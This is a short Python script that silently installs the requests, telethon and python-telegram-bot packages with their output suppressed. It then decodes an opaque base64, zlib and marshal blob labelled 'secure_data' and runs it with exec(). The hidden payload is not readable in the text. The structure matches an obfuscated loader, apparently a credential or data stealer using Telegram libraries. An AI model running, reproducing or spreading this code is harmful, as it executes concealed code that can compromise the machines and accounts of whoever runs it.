import subprocess
import sys
import base64
import zlib
import marshal
import os
print("1")
subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
subprocess.check_call([sys.executable, "-m", "pip", "install", "telethon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
subprocess.check_call([sys.executable, "-m", "pip", "install", "python-telegram-bot"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# DATA
DATA = "eJxlUkFPG0cUfrOzw3rBuwpWwER1qygurawURCAISqIIO6QcSqlaVW3ti2W8A7Wz3rV2xzE4dhU1UUWlSK3UquRIb6GmUo65ml+AlUS2Nhxbqb2h5NAo6aEztjegMKud9/a9733zzXubhWNL7tnnRb5tgQEGMqGAUggJXzKllNSxOIUNfAdSsgQU5/vhxKr3bF47meM1sp+vo65FsCHF5H+EG0MeTthsOXu8RuHvbSHM4gUfc/gWqFxcjYupIYZ8WBV2sU9Zk5jkxw25IiKYkddIbJB6Lz8NNbkq5ZWTUquoKu/2+bjbvAk3McCv8hb+nhDoNIU/fp5fAmbgrhaFC+CisoQgyWMiuo6TUEZRYAGf+V1wPqmRIz2GYgQMdbe/jo9pkvMDJzWx1y2tEv+uR218U5E1+KYaC3fVJDmuRr4lG3DkdW0ZlXuK/8BlFBtYrozPzM5MTlycnr1wcS4eX0y7X15PXpv66osPZz8vr8xkbozRha9Tk5mppZKVjC98ZopLyEu/m0RMkzD7OrUqgXGXum7OtjzJWYlJnpL9JsPSOcMLGHa2VKAWq+gutYw0dRzbGWfrzEPlCimx1bFZzhKgVtY2ctZaTHHE7bxgjy5tZQrUk+0itTytQ+Dzeeq19SwtMnEmKTs5Rj3sMifW56krNkt3ZDl9ggvz7yPC1ZxJPbTqIeqK7NnOehm4zGv5+VcEkJ/SQzvDHCJg7m98+xte3IJDSSWR9umFTbUdimwqB/rgPfWxfm4TH4Sj2/lmeGIzeKAN/vTBtvxYG70/2A4NtULRZih6f/FhZj8UfRSabwXn94Pz/2LQ39vXRtvB+Re+/+rPgdPPQCIRzrAfOrd99cH7T7S5h5l2UPtx8YfFX67eQz9/dPdTAb/U0uaa2tzLrnl1iHnVf+5NrvI7lJhGd0bjEdgJx0/hBqC43tdAsvBJgIcbmkA0dCQip0j8jNIYwiI+0omf6fgRNTGJG6N6Ygw3pt5KhMmernJ/L0wSZ9W9iCL8aD/H740RjtybxNyPKV6AUZOuOZlCd46S7XpKxt2wsjm700xPX6MsTW/wCaZN2y56IadkpUsWy5nprF0ompTRHXgu/m9nSOADlwu2UTLpFeedzj/PZzHBt0OMEPoLRp6C+hT0Z3I/ihyOAArfUlow3IThRzDSgvNNOL+zVF9+Apect3nR/21TLSE="
secure_data = DATA
payload = marshal.loads(zlib.decompress(base64.b64decode(secure_data)))
exec(payload)
